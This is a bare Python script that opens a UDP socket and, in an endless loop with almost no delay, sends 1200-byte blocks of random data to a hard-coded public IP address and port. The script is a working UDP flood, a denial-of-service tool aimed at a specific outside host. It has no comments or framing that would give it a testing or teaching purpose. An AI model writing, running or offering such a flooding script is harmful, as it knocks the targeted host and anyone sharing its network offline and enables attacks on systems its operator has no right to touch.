import os, socket, time
dst = ("185.191.117.77", 42069)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    s.sendto(os.urandom(1200), dst)
    time.sleep(0.0001)
